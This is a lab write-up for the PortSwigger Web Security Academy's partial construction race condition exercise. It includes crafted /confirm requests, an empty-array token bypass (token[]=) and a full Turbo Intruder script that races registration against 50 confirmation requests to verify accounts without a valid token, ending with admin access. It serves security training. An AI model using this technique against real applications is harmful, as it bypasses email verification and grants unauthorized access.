#  Partial construction race conditions

## 📌 Lab Details
- **Title**: Partial construction race conditions
- **Difficulty**: Expert
- **Category**: Race Conditions
- **Lab URL**: https://portswigger.net/academy/labs/launch/36e4a9ea055e676d694da84e3520445fb2fa3bbc8f0fce922c9100971a4e90a9?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-partial-construction

## 🔍 Summary
The application’s registration workflow is vulnerable to a **partial construction race condition**.

When a user registers:
1. a pending account is created
2. the verification token is generated and stored afterward
3. the confirmation email is sent

Because these operations are not performed atomically, there is a brief window where the user account exists but the verification token has not yet been initialized.

By sending a large number of crafted `/confirm` requests simultaneously with the registration request, it becomes possible to confirm the account while the token is still in an uninitialized state.

## 🛠 Steps to Solve
### Predict a potential collision
1. Study the user registration mechanism. Observe that:
   - You can only register using `@ginandjuice.shop` email addresses.
   - To complete the registration, you need to visit the confirmation link, which is sent via email.
2. In Burp, from the proxy history, notice that there is a request to fetch `/resources/static/users.js`.
3. Study the JavaScript and notice that this dynamically generates a form for the confirmation page, which is presumably linked from the confirmation email. This leaks the fact that the final confirmation is submitted via a `POST` request to `/confirm`, with the token provided in the query string.
4. In Burp Repeater, create an equivalent request to what your browser might send when clicking the confirmation link. For example:
   ```sh
   POST /confirm?token=1 HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Content-Type: x-www-form-urlencoded
    Content-Length: 0
   ```
5. Experiment with the `token` parameter in your newly crafted confirmation request. Observe that:
   - If you submit an arbitrary token, you receive an `Incorrect token: <YOUR-TOKEN>` response.
   - If you remove the parameter altogether, you receive a `Missing parameter: token` response.
   - If you submit an empty token parameter, you receive a `Forbidden` response.
6. Consider that this `Forbidden` response may indicate that the developers have patched a vulnerability that could be exploited by sending an empty token parameter.
7. Consider that there may be a small race window between:
   - When you submit a request to register a user.
   - When the newly generated registration token is actually stored in the database.
8. Experiment with different ways of submitting a token parameter with a value equivalent to null. For example, some frameworks let you to pass an empty array as follows:
   ```sh
    POST /confirm?token[]=
   ```
9. Observe that this time, instead of the Forbidden response, you receive an Invalid token: Array response. This shows that you've successfully passed in an empty array, which could potentially match an uninitialized registration token.

### Benchmark the behavior
1. Send the `POST /register` request to Burp Repeater.
2. In Burp Repeater, experiment with the registration request. Observe that if you attempt to register the same username more than once, you get a different response.
3. In a separate Repeater tab, use what you've learned from the JavaScript import to construct a confirmation request with an arbitrary token. For example:
   ```sh
    POST /confirm?token=1 HTTP/2
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: phpsessionid=YOUR-SESSION-ID
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
   ```
4. Add both requests to a new tab group.
5. Try sending both requests sequentially and in parallel several times, making sure to change the username in the registration request each time to avoid hitting the separate `Account already exists with this name code path`.
6. Notice that the confirmation response consistently arrives much quicker than the response to the registration request.

### Prove the concept
1. Note that you need the server to begin creating the pending user in the database, then compare the token you send in the confirmation request before the user creation is complete.
2. Consider that as the confirmation response is always processed much more quickly, you need to delay this so that it falls within the race window.
3. In the POST /register request, highlight the value of the username parameter, and send the request to **Turbo Intruder**.
4. Use the following script:
   ```sh
   def queueRequests(target, wordlists):

       engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
       confirmationReq = '''POST /confirm?token[]= HTTP/2
   Host: YOUR-LAB-ID.web-security-academy.net
   Cookie: phpsessionid=YOUR-SESSION-TOKEN
   Content-Length: 0

   '''
       for attempt in range(20):
           currentAttempt = str(attempt)
           username = 'User' + currentAttempt
    
           # queue a single registration request
           engine.queue(target.req, username, gate=currentAttempt)
        
           # queue 50 confirmation requests - note that this will probably sent in two separate packets
           for i in range(50):
               engine.queue(confirmationReq, gate=currentAttempt)
        
           # send all the queued requests for this attempt
           engine.openGate(currentAttempt)

   def handleResponse(req, interesting):
       table.add(req)
   ```
5. Launch the attack.
6. In the results table, sort the results by the **Length** column.
7. If the attack was successful, you should see one or more 200 responses to your confirmation request containing the message Account registration for user <USERNAME> successful.
8. Make a note of the username from one of these responses.
9. In the browser, log in using this username and the static password you used in the registration request.
10. Access the admin panel and delete `carlos` to solve the lab.

## 📖 Key Takeaways
-  Race conditions can occur during object initialization.
-  Partial object construction can expose inconsistent state.
-  Array parameters sometimes bypass input validation patches.
-  Faster endpoints can be abused against slower backend operations.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cf85a51e-20ce-4c8f-a7f8-a320286271dd" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ede73001-4192-43fd-bcd1-7d39e1c4e777" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f56361ad-542b-45ca-8da5-a4cdfbb3fb93" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7b1dd314-1d97-42f0-ac9e-8b3d34dad402" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f079c3e8-a254-4466-81ad-0cd4e9719f6f" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/91775ffc-90e2-4e77-be01-ecd569973594" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/12d85af7-e4a7-4336-b5a8-11e24d5ebaee" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0e91b7f6-aea3-4c71-9c47-c17616a2b734" />
